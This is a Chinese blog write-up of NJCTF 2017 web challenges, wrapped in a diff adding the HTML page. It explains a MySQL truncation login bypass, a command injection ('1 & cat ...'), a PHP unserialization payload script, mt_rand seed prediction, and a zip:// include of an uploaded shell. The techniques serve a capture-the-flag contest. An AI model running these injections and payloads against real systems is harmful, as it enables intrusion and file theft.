@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      NJCTF 2017 writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="NJCTF - XCTF联赛南京站这次比赛 web 题好多啊 - - WebLogin - 100 login?http://218.2.197.235:23731/  弱口令利用的数据库字段的长度限制，注册一个 admin+很多空格+hs 的用户，登录时用 admin 及注册时的密码就可以成功登录拿到 flag放个本地 MySQL 的演示就明白了1234567891011121314151617">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJCTF 2017 writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/03/15/NJCTF-2017-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="NJCTF - XCTF联赛南京站这次比赛 web 题好多啊 - - WebLogin - 100 login?http://218.2.197.235:23731/  弱口令利用的数据库字段的长度限制，注册一个 admin+很多空格+hs 的用户，登录时用 admin 及注册时的密码就可以成功登录拿到 flag放个本地 MySQL 的演示就明白了1234567891011121314151617">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/NJCTF_2017_1.png">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NJCTF 2017 writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="NJCTF - XCTF联赛南京站这次比赛 web 题好多啊 - - WebLogin - 100 login?http://218.2.197.235:23731/  弱口令利用的数据库字段的长度限制，注册一个 admin+很多空格+hs 的用户，登录时用 admin 及注册时的密码就可以成功登录拿到 flag放个本地 MySQL 的演示就明白了1234567891011121314151617">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/NJCTF_2017_1.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">NJCTF 2017 writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-03-15" class="post-meta__date date">2017-03-15</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>NJCTF - XCTF联赛南京站<br>这次比赛 web 题好多啊 - -</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login-100"><a href="#Login-100" class="headerlink" title="Login - 100"></a>Login - 100</h3><blockquote>
+<p>login?<br><a href="http://218.2.197.235:23731/" target="_blank" rel="external">http://218.2.197.235:23731/</a></p>
+</blockquote>
+<p><del>弱口令</del><br>利用的数据库字段的长度限制，注册一个 admin+很多空格+hs 的用户，登录时用 admin 及注册时的密码就可以成功登录拿到 flag<br>放个本地 MySQL 的演示就明白了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users(username char(10),password char(10));</span><br><span class="line">Query OK, 0 rows affected (0.11 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUES('admin','secret');</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUES('admin               1','123456');</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+<span class="comment">----------+----------+</span></span><br><span class="line">| username | password |</span><br><span class="line">+<span class="comment">----------+----------+</span></span><br><span class="line">| admin    | secret   |</span><br><span class="line">| admin    | 123456   |</span><br><span class="line">+<span class="comment">----------+----------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
+<p>所以 admin 用户是有很多密码的，其中有人登录时用的弱口令，所以出现了最初的情形，不过既然注册时有密码必须包含字母、数字、特殊字符的限制，为什么 admin123 还会登录成功？</p>
+<h3 id="Get-Flag-100"><a href="#Get-Flag-100" class="headerlink" title="Get Flag - 100"></a>Get Flag - 100</h3><blockquote>
+<p>别BB，来拿FLAG<br>PS:delay 5s<br><a href="http://218.2.197.235:23725/" target="_blank" rel="external">http://218.2.197.235:23725/</a></p>
+</blockquote>
+<p>有一个输入框，输入后会执行 cat 命令，返回一张图片，base64 解密后便可以得到命令的返回值，过滤了很多关键字和符号，包括 <code>;</code> 、<code>` </code> ，但是 <code>&amp;</code> 没有被过滤，这样我们就能执行任意的命令了，最后 flag 在根目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 &amp; cat ../../9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</span><br><span class="line">NJCTF&#123;Simp13_Pyth0n_C0de_Inj3cti0n_a77ack&#125;cat: images/1: No such file or directory</span><br></pre></td></tr></table></figure></p>
+<p>后来拖源码时才发现 images 目录下有个 flag.txt 放着假的 flag  233</p>
+<h3 id="Text-wall-350"><a href="#Text-wall-350" class="headerlink" title="Text wall - 350"></a>Text wall - 350</h3><p>…<br><a href="https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/" target="_blank" rel="external">https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">new</span> filelist();</span><br><span class="line">$foo-&gt;source = <span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">$bar = [];</span><br><span class="line">$bar[] = $foo;</span><br><span class="line"></span><br><span class="line">$m = serialize($bar);</span><br><span class="line">$h = sha1($m);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode($h.$m);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>读取 index.php 拿到源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//The flag is /var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g</span></span></span><br><span class="line"><span class="php">$lists = [];</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'lists'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $cookie = $_COOKIE[<span class="string">'lists'</span>];</span></span><br><span class="line"><span class="php">    $hash = substr($cookie, <span class="number">0</span>, <span class="number">40</span>);</span></span><br><span class="line"><span class="php">    $sha1 = substr($cookie, <span class="number">40</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(sha1($sha1) === $hash)&#123;</span></span><br><span class="line"><span class="php">        $lists = unserialize($sha1);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'hiehiehie'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $info = $_POST[<span class="string">'hiehiehie'</span>];</span></span><br><span class="line"><span class="php">    $lists[] = $info;</span></span><br><span class="line"><span class="php">    $sha1 = serialize($lists);</span></span><br><span class="line"><span class="php">    $hash = sha1($sha1);</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'lists'</span>, $hash.$sha1);</span></span><br><span class="line"><span class="php">    header(<span class="string">'Location: '</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Please Get Flag!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"jumbotron"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Please Get Flag!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($lists <span class="keyword">as</span> $info):<span class="meta">?&gt;</span></span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$info<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"hiehiehie"</span> <span class="attr">value</span>=<span class="string">"hiehiehie"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>再去读 flag 文件，得到 flag<br>NJCTF{PHP_un5erialization_a77ack_i5_very_Interes71ng}</p>
+<h3 id="Guess-100"><a href="#Guess-100" class="headerlink" title="Guess - 100"></a>Guess - 100</h3><blockquote>
+<p>Being Tired? ctfer? Here is an easy one for Old Drivers and Meng Xins, everyone knows how to solve it!<br><a href="http://218.2.197.235:23735/" target="_blank" rel="external">http://218.2.197.235:23735/</a></p>
+</blockquote>
+<p>是一个上传图片的站，有文件包含，读到了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,<span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,<span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,<span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,<span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    $ss = mt_rand();</span><br><span class="line">    $hash = md5(session_id() . $ss);</span><br><span class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    $check1 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">    $check2=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($check2) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($check1) &#123;</span><br><span class="line">        $filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">            show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到上传的文件在原文件名前加上了32位的随机字符串，刚开始想的是上传后爆破这个随机串，但是有 61^32 种可能性，一天也跑不完，后来知道是爆破随机数种子，因为 mt_rand 对于同一个种子来说，产生的随机数序列是固定的，而产生的32位随机串就是用的 mt_rand 来产生的，但是直接请求页面的话太慢了，注意到这几行代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">mt_srand($seed);</span><br><span class="line">$ss = mt_rand();</span><br><span class="line">$hash = md5(session_id() . $ss);</span><br><span class="line">setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br></pre></td></tr></table></figure></p>
+<p><code>session_id()</code> 是用来获取 会话ID 的，如果把 PHPSESSID 设置为空的话，我们就可以得到 \$ss(即产生的第一个随机数) 的 md5 值，拿到 md5 查询网站上可以得到 \$ss 的值，那么就可以爆破种子，满足第一个随机数与我们的相同的即为我们想要获得的种子。因为 php 爆破还是太慢，我这里用了一个叫 php_mt_seed 的 c语言 写的工具，不到一分钟就可以跑出种子。然后就可以得到文件名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mt_srand(<span class="string">'10818363'</span>);</span><br><span class="line">    <span class="keyword">echo</span> mt_rand().<span class="string">"\n"</span>;</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,<span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,<span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,<span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> random_str();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后利用之前出题时 zip伪协议 包含的思路上传包含 shell 文件的 zip 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=zip://uP1O4Ds/vN3LOt2mcnaAJtBXXraTwrESO3VbjkAt_233.png%23shell</span><br></pre></td></tr></table></figure></p>
